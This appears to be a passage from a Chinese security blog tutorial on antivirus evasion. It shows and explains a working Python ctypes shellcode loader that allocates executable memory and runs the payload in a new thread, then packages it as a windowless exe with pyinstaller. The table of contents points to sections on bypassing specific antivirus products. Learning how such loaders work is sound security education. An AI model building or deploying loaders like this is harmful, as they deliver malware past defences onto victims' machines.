<p>因此 ((void(*)())Memory)();  就可以拆开理解了</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">(     (<span class="built_in">void</span>(*)())Memory    )();</span><br><span class="line"><span class="comment">// 先看中间部分，将Memory进行强制类型转化成一个函数指针（指向返回值为void类型的函数的指针）</span></span><br><span class="line"><span class="comment">// 此时 Memory 已经是一个函数指针了，现在回忆一下，刚刚我们是怎么调用 函数指针所指向的函数的呢？</span></span><br><span class="line"><span class="comment">// 没错，就是(*Memory)(); 或者直接使用简写 Memory();</span></span><br></pre></td></tr></table></figure>

<blockquote>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.runoob.com/w3cnote/c-pointer-detail.html">C 指针详解</a></li>
<li><a target="_blank" rel="noopener" href="http://c.biancheng.net/view/228.html">函数指针及其定义和用法，C语言函数指针详解</a></li>
</ul>
</blockquote>
<h1 id="shellcodeLoder-Python（学完python再来看）"><a href="#shellcodeLoder-Python（学完python再来看）" class="headerlink" title="shellcodeLoder-Python（学完python再来看）"></a>shellcodeLoder-Python（学完python再来看）</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="keyword">import</span> ctypes<span class="comment">#主要用到此库</span></span><br><span class="line">shellcode = <span class="built_in">bytearray</span>(<span class="string">&quot;shellcode&quot;</span>)</span><br><span class="line">ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64</span><br><span class="line"><span class="comment"># 1. 通过 VirtualAlloc 申请内存区域</span></span><br><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>), </span><br><span class="line">ctypes.c_int(<span class="built_in">len</span>(shellcode)), ctypes.c_int(<span class="number">0x3000</span>), ctypes.c_int(<span class="number">0x40</span>))</span><br><span class="line"><span class="comment"># 2. 通过 RtlMoveMemory 把shellcode复制到申请的内存中</span></span><br><span class="line">buf = (ctypes.c_char * <span class="built_in">len</span>(shellcode)).from_buffer(shellcode)</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(</span><br><span class="line"> ctypes.c_uint64(ptr), </span><br><span class="line"> buf, </span><br><span class="line"> ctypes.c_int(<span class="built_in">len</span>(shellcode))</span><br><span class="line">)</span><br><span class="line"><span class="comment"># 3. 通过 CreateThread 创建线程执行shellcode</span></span><br><span class="line">handle = ctypes.windll.kernel32.CreateThread(</span><br><span class="line">    ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">    ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">    ctypes.c_uint64(ptr),</span><br><span class="line">    ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">    ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">    ctypes.pointer(ctypes.c_int(<span class="number">0</span>))</span><br><span class="line">)</span><br><span class="line"><span class="comment"># 4. 通过  WaitForSingleObject 检测线程对象的状态，为了让线程一直处于运行状态</span></span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-<span class="number">1</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>执行python的代码需要有python环境，但是呢，我们可以直接打包可执行程序~~~这样限制就少了一点</p>
<p>pyinstaller打包python代码为exe：</p>
<blockquote>
<ol>
<li>安装pyinstaller</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip3 install pyinstaller</span><br></pre></td></tr></table></figure>

<ol>
<li>打包python代码</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pyinstaller.exe -F -w .\sc.py</span><br></pre></td></tr></table></figure>
</blockquote>
<p>需要注意的是~~同样这样打包生成的exe是无法免杀的<del>我们同样可以定位查杀特征进行混淆绕过</del>—同样下节课会讲到</p>
<h2 id="Python内存加载原理"><a href="#Python内存加载原理" class="headerlink" title="Python内存加载原理"></a>Python内存加载原理</h2><p>大部分脚本语言加载 shellcode 其实都是通过 c 的 ffi 去调用操作系统的api，因此只要知道 c 是如何加载 shellcode，那么其它的其实就都一样了。</p>
<ol>
<li>申请一片拥有可读可写可执行的内存区域</li>
<li>将 shellcode 载入到申请的内存区域</li>
<li>跳转到 shellcode 首地址开始执行</li>
</ol>
<h2 id="Ctypes库"><a href="#Ctypes库" class="headerlink" title="Ctypes库"></a>Ctypes库</h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://docs.python.org/zh-cn/3.7/library/ctypes.html">https://docs.python.org/zh-cn/3.7/library/ctypes.html</a></p>
</blockquote>
<p>ctypes  是 Python 的外部函数库。它提供了与 C 兼容的数据类型，并允许调用 DLL 或共享库中的函数。可使用该模块以纯 Python 形式对这些库进行封装。</p>
<ul>
<li>载入动态连接库</li>
</ul>
<p>ctypes  导出了 cdll  对象，在 Windows 系统中还导出了 windll  和 oledll  对象用于载入动态连接库。</p>
<p>通过操作这些对象的属性，你可以载入外部的动态链接库。</p>
<h2 id="转换数据类型"><a href="#转换数据类型" class="headerlink" title="转换数据类型"></a>转换数据类型</h2><p>因为后面要把shellcode载入内存，所以将shellcode转换为字节类型</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line">shellcode = <span class="built_in">bytearray</span>(<span class="string">&quot;shellcode&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="设置VirtualAlloc返回类型"><a href="#设置VirtualAlloc返回类型" class="headerlink" title="设置VirtualAlloc返回类型"></a>设置VirtualAlloc返回类型</h2><p>要能在64位系统上运行，必须使用 restype  函数设置 VirtualAlloc  返回类型为 ctypes.c_unit64 ，否则默认是 32 位</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64</span><br></pre></td></tr></table></figure>

<h2 id="VirtualAlloc-函数申请内存"><a href="#VirtualAlloc-函数申请内存" class="headerlink" title="VirtualAlloc 函数申请内存"></a>VirtualAlloc 函数申请内存</h2><p>函数在调用进程的虚拟地址空间中保留或申请内存区域，VirtualAlloc分配的内存被初始化为零。python中采用ctypes调用VirtualAlloc 函数</p>
<ul>
<li>函数原型</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LPVOID VirtualAlloc(</span><br><span class="line">  LPVOID lpAddress,         #指向要分配内存的指定起始地址</span><br><span class="line">  DWORD dwSize,             #指定分配内存的大小</span><br><span class="line">  DWORD flAllocationType,   #指定分配内存的类型</span><br><span class="line">  DWORD flProtect           #该内存的初始保护属性</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<ul>
<li>方法</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>), ctypes.c_int(<span class="built_in">len</span>(shellcode)), ctypes.c_int(<span class="number">0x3000</span>), ctypes.c_int(<span class="number">0x40</span>))</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#解释：和上面c的函数原型很类似</span></span><br><span class="line"><span class="comment">#ctypes.c_int(0)：	</span></span><br><span class="line">如果此参数为NULL，则系统确定内存分配将区域的位置，按<span class="number">64</span>-KB向上取整。</span><br><span class="line"><span class="comment">#ctypes.c_int(len(shellcode))：	</span></span><br><span class="line">要分配或者保留的区域的大小，以字节为单位。</span><br><span class="line"><span class="comment">#ctypes.c_int(0x3000)	====&gt;	c里面的MEM_COMMIT | MEM_RESERVE	</span></span><br><span class="line">分配类型值为 <span class="number">0x3000</span> ，是 MEM_COMMIT(<span class="number">0x1000</span>) 和 MEM_RESERVE(<span class="number">0x2000</span>)类型的合并</span><br><span class="line"><span class="comment">#ctypes.c_int(0x40)：	</span></span><br><span class="line">访问类型值为 <span class="number">0x40</span> ，访问类型为 PAGE_EXECUTE_READWRITE ,此区域可读写执行。</span><br></pre></td></tr></table></figure>

<blockquote>
<p>更多参考：<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/VirtualAlloc/1606859?fr=aladdin">https://baike.baidu.com/item/VirtualAlloc/1606859?fr=aladdin</a></p>
</blockquote>
<h2 id="将Shellcode载入内存"><a href="#将Shellcode载入内存" class="headerlink" title="将Shellcode载入内存"></a>将Shellcode载入内存</h2><p>调用 RtlMoveMemory  函数从指定内存中复制内容至另一内存</p>
<ul>
<li>函数原型（类似前面c中的memcpy()）</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">RtlMoveMemory(</span><br><span class="line">    Destination,    <span class="comment">#指向要移动目的地址的指针</span></span><br><span class="line">    Source,         <span class="comment">#指向要复制的内存地址的指针</span></span><br><span class="line">    Length          <span class="comment">#指定复制内容的字节数</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<ul>
<li>方法</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">buf = (ctypes.c_char * <span class="built_in">len</span>(shellcode)).from_buffer(shellcode)</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(</span><br><span class="line"> ctypes.c_uint64(ptr),</span><br><span class="line"> buf,</span><br><span class="line"> ctypes.c_int(<span class="built_in">len</span>(shellcode))</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<h2 id="CreateThread创建线程（开始执行）"><a href="#CreateThread创建线程（开始执行）" class="headerlink" title="CreateThread创建线程（开始执行）"></a>CreateThread创建线程（开始执行）</h2><p>创建一个线程从shellcode载入位置首地址开始执行。调用 CreateThread  将在主线程的基础上创建一个新线程</p>
<ul>
<li>函数原型</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">HANDLE CreateThread(</span><br><span class="line">LPSECURITY_ATTRIBUTES lpThreadAttributes,   <span class="comment">#线程安全属性</span></span><br><span class="line">SIZE_T dwStackSize,                         <span class="comment">#设置初始栈的大小，以字节为单位</span></span><br><span class="line">LPTHREAD_START_ROUTINE lpStartAddress,      <span class="comment">#指向线程函数的指针</span></span><br><span class="line">LPVOID lpParameter,                         <span class="comment">#向线程函数传递的参数</span></span><br><span class="line">DWORD dwCreationFlags,                      <span class="comment">#线程创建属性</span></span><br><span class="line">LPDWORD lpThreadId                          <span class="comment">#保存新线程的id</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<ul>
<li>方法</li>
</ul>
<p>创建一个线程从shellcode放置位置开始执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">handle = ctypes.windll.kernel32.CreateThread(</span><br><span class="line">    ctypes.c_int(0),                        #NULL，使用默认安全性</span><br><span class="line">    ctypes.c_int(0),                        #默认将使用与调用该函数的线程相同的栈空间大小  </span><br><span class="line">    ctypes.c_uint64(ptr),                   #定位到申请的内存所在的位置 </span><br><span class="line">    ctypes.c_int(0),                        #NULL，不需传递参数</span><br><span class="line">    ctypes.c_int(0),                        #属性为0，线程创建后立即激活</span><br><span class="line">    ctypes.pointer(ctypes.c_int(0))         #不想返回线程ID,设置值为NULL</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>更多参考：<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/CreateThread/8222652?fr=aladdin">https://baike.baidu.com/item/CreateThread/8222652?fr=aladdin</a></p>
</blockquote>
<h2 id="等待创建的线程运行结束"><a href="#等待创建的线程运行结束" class="headerlink" title="等待创建的线程运行结束"></a>等待创建的线程运行结束</h2><p>上线结束后 我们才能退出，不然该程序执行完就会退出~~~~</p>
<p>调用 WaitForSingleObject  函数用来检测线程的状态</p>
<ul>
<li>函数原型</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">DWORD WINAPI WaitForSingleObject(</span><br><span class="line">    __<span class="keyword">in</span> HANDLE hHandle,        <span class="comment">#对象句柄，可以指定一系列的对象</span></span><br><span class="line">    __<span class="keyword">in</span> DWORD dwMilliseconds   <span class="comment">#定时时间间隔，单位为毫秒</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>dwMilliseconds  如果指定一个非零值，函数处于等待状态直到 Handle （创建线程时返回的线程句柄）标记的对象被触发，或者时间到了。</p>
<p>为了保持创建的线程一直运行，因此将时间设置为负数，让函数一直处于等待状态，而不会结束运行。</p>
<ul>
<li>方法</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-<span class="number">1</span>))</span><br></pre></td></tr></table></figure>

<blockquote>
<p>更多参考：<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/WaitForSingleObject/3534838?fr=aladdin">https://baike.baidu.com/item/WaitForSingleObject/3534838?fr=aladdin</a></p>
</blockquote>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://example.com">晚上十一点睡觉</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2022-09-08-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/%E5%85%8D%E6%9D%80/%E5%B8%B8%E7%94%A8%E5%85%8D%E6%9D%80%E5%B7%A5%E5%85%B7/">http://example.com/2022-09-08-渗透测试/内网/免杀/常用免杀工具/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">我的路-</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208182237500.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022-09-02-Coder/Windows-DOS%E5%91%BD%E4%BB%A4-%E6%89%B9%E5%A4%84%E7%90%86%E8%84%9A%E6%9C%AC%E5%AD%A6%E4%B9%A0/"><img class="prev-cover" src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208182237523.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Windows DOS命令\批处理脚本学习</div></div></a></div><div class="next-post pull-right"><a href="/2022-09-08-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/%E5%85%8D%E6%9D%80/Shellcode%E5%85%8D%E6%9D%80/"><img class="next-cover" src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208211308753.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Shellcode免杀</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208151640204.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">晚上十一点睡觉</div><div class="author-info__description">晚上十一点のBlog</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">50</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">40</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">25</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/11pmsleep"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/11pmsleep" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:860637048@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="tencent://AddContact/?fromId=45&amp;fromSubId=1&amp;subcmd=all&amp;uin=860637048" target="_blank" title="qq"><i class="fab fa-qq"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">网安新人，欢迎交流技术~~~ Blog仅供个人记录笔记学习所用，若有侵权，联系我删除~</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%8D%E6%9D%80%E7%9B%B8%E5%85%B3%E6%A6%82%E5%BF%B5-%E7%AE%80%E5%8D%95%E6%A6%82%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text">免杀相关概念(简单概述)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%80%E6%9C%AF%E5%88%86%E7%B1%BB"><span class="toc-number">1.1.</span> <span class="toc-text">技术分类</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Refer"><span class="toc-number">1.2.</span> <span class="toc-text">Refer</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%8D%E6%9D%80%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83"><span class="toc-number">2.</span> <span class="toc-text">免杀测试环境</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%9F%A5%E6%9D%80%E6%96%B9%E5%BC%8F"><span class="toc-number">3.</span> <span class="toc-text">常见查杀方式</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%80%E8%BD%AF%E6%A3%80%E6%B5%8B%E6%8A%80%E6%9C%AF%E4%BB%8B%E7%BB%8D"><span class="toc-number">3.1.</span> <span class="toc-text">杀软检测技术介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E7%AD%BE%E5%90%8D%E7%9A%84%E6%A3%80%E6%B5%8B"><span class="toc-number">3.1.1.</span> <span class="toc-text">基于签名的检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90"><span class="toc-number">3.1.2.</span> <span class="toc-text">静态程序分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90"><span class="toc-number">3.1.3.</span> <span class="toc-text">动态程序分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B2%99%E7%9B%92%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF"><span class="toc-number">3.1.4.</span> <span class="toc-text">沙盒分析技术</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%AF%E5%8F%91%E5%BC%8F%E5%88%86%E6%9E%90"><span class="toc-number">3.1.5.</span> <span class="toc-text">启发式分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E7%86%B5%E6%A3%80%E6%B5%8B"><span class="toc-number">3.1.6.</span> <span class="toc-text">信息熵检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E5%B8%B8%E8%A7%81%E6%A3%80%E6%B5%8B%E6%8A%80%E6%9C%AF"><span class="toc-number">3.1.7.</span> <span class="toc-text">其他常见检测技术</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B7%B7%E6%B7%86%E6%A3%80%E6%B5%8B"><span class="toc-number">3.1.7.1.</span> <span class="toc-text">混淆检测</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8A%A0%E5%A3%B3%E6%A3%80%E6%B5%8B"><span class="toc-number">3.1.7.2.</span> <span class="toc-text">加壳检测</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8A%A0%E5%AF%86%E6%A3%80%E6%B5%8B"><span class="toc-number">3.1.7.3.</span> <span class="toc-text">加密检测</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%9D%80%E8%BD%AF%E7%89%B9%E7%82%B9"><span class="toc-number">3.2.</span> <span class="toc-text">常见杀软特点</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%81%AB%E7%BB%92"><span class="toc-number">3.2.1.</span> <span class="toc-text">火绒</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#360"><span class="toc-number">3.2.2.</span> <span class="toc-text">360</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E5%85%8D%E6%9D%80%E6%96%B9%E5%BC%8F"><span class="toc-number">4.</span> <span class="toc-text">常见免杀方式</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%89%B9%E5%BE%81%E7%A0%81%E5%85%8D%E6%9D%80"><span class="toc-number">4.1.</span> <span class="toc-text">特征码免杀</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8A%B1%E6%8C%87%E4%BB%A4%E5%85%8D%E6%9D%80"><span class="toc-number">4.2.</span> <span class="toc-text">花指令免杀</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8A%A0%E5%A3%B3%E5%85%8D%E6%9D%80"><span class="toc-number">4.3.</span> <span class="toc-text">加壳免杀</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A0%E5%86%B7%E9%97%A8%E5%A3%B3"><span class="toc-number">4.3.1.</span> <span class="toc-text">加冷门壳</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A0%E5%A3%B3%E6%94%B9%E5%A3%B3"><span class="toc-number">4.3.2.</span> <span class="toc-text">加壳改壳</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86"><span class="toc-number">4.3.3.</span> <span class="toc-text">加密解密</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80"><span class="toc-number">4.4.</span> <span class="toc-text">分离免杀</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B5%84%E6%BA%90%E4%BF%AE%E6%94%B9"><span class="toc-number">4.5.</span> <span class="toc-text">资源修改</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%B9%E7%A8%8B%E5%BA%8F%E5%85%A5%E5%8F%A3%E7%82%B9"><span class="toc-number">4.6.</span> <span class="toc-text">改程序入口点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%8D%E6%9D%80%E4%BF%AE%E6%94%B9%E6%8A%80%E5%B7%A7%E2%80%94%E2%80%94%E4%BF%AE%E6%94%B9%E5%86%85%E5%AD%98%E7%89%B9%E5%BE%81%E7%A0%81%EF%BC%9A"><span class="toc-number">4.7.</span> <span class="toc-text">免杀修改技巧——修改内存特征码：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%80%E6%96%B0%E7%9A%84%E6%97%A0%E7%89%B9%E5%BE%81%E5%85%8D%E6%9D%80%E6%B3%95"><span class="toc-number">4.8.</span> <span class="toc-text">最新的无特征免杀法</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#darkarmour"><span class="toc-number">5.</span> <span class="toc-text">darkarmour</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">5.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E8%A3%85"><span class="toc-number">5.2.</span> <span class="toc-text">安装</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%A8%E6%B3%95"><span class="toc-number">5.3.</span> <span class="toc-text">用法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E6%88%98%E5%85%8D%E6%9D%80mimikatz"><span class="toc-number">5.4.</span> <span class="toc-text">实战免杀mimikatz</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E6%88%98MSF%E5%85%8D%E6%9D%80"><span class="toc-number">5.5.</span> <span class="toc-text">实战MSF免杀</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8E%A9%E6%97%A5-%E9%80%82%E7%94%A8%E4%BA%8E%E7%BA%A2%E9%98%9F%E7%9A%84%E7%BB%BC%E5%90%88%E5%85%8D%E6%9D%80%E5%B7%A5%E5%85%B7"><span class="toc-number">6.</span> <span class="toc-text">掩日 - 适用于红队的综合免杀工具</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%BC%BA%E7%83%88%E6%8E%A8%E8%8D%90%EF%BC%89"><span class="toc-number">7.</span> <span class="toc-text">免杀学习（强烈推荐）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#shellcode%E7%AE%80%E4%BB%8B"><span class="toc-number">8.</span> <span class="toc-text">shellcode简介</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#shellcode-launch"><span class="toc-number">9.</span> <span class="toc-text">shellcode-launch</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A1%B9%E7%9B%AE%E5%9C%B0%E5%9D%80"><span class="toc-number">9.1.</span> <span class="toc-text">项目地址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E8%A3%85GO%E7%8E%AF%E5%A2%83"><span class="toc-number">9.2.</span> <span class="toc-text">安装GO环境</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Go-%E5%AE%89%E8%A3%85"><span class="toc-number">9.2.1.</span> <span class="toc-text">Go 安装</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Go-%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="toc-number">9.2.2.</span> <span class="toc-text">Go 环境配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GOPATH"><span class="toc-number">9.2.3.</span> <span class="toc-text">GOPATH</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BC%96%E8%AF%91%E9%A1%B9%E7%9B%AE"><span class="toc-number">9.3.</span> <span class="toc-text">编译项目</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8B%E8%BD%BD%E9%A1%B9%E7%9B%AE"><span class="toc-number">9.3.1.</span> <span class="toc-text">下载项目</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSF%E6%88%96CS%E7%94%9F%E6%88%90C%E7%9A%84shellcode"><span class="toc-number">9.3.2.</span> <span class="toc-text">MSF或CS生成C的shellcode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9winlaunch-go"><span class="toc-number">9.3.3.</span> <span class="toc-text">修改winlaunch.go</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E8%AF%91%E7%94%9F%E6%88%90exe"><span class="toc-number">9.3.4.</span> <span class="toc-text">编译生成exe</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E7%81%AB%E7%BB%92"><span class="toc-number">9.3.5.</span> <span class="toc-text">过火绒</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87360"><span class="toc-number">9.3.6.</span> <span class="toc-text">过360</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#shellcode-loader"><span class="toc-number">10.</span> <span class="toc-text">shellcode loader</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#shellcodeLoader-c-x2F-c"><span class="toc-number">11.</span> <span class="toc-text">shellcodeLoader-c&#x2F;c++</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81"><span class="toc-number">11.1.</span> <span class="toc-text">代码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E8%AF%A6%E8%A7%A3"><span class="toc-number">11.2.</span> <span class="toc-text">代码详解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#include%E8%AF%AD%E6%B3%95%E8%A7%A3%E9%87%8A"><span class="toc-number">11.2.1.</span> <span class="toc-text">include语法解释</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9A%90%E8%97%8F%E6%8E%A7%E5%88%B6%E5%8F%B0"><span class="toc-number">11.2.2.</span> <span class="toc-text">隐藏控制台</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ShowWindow-%E5%92%8CGetConsoleWindow"><span class="toc-number">11.2.3.</span> <span class="toc-text">ShowWindow()和GetConsoleWindow()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 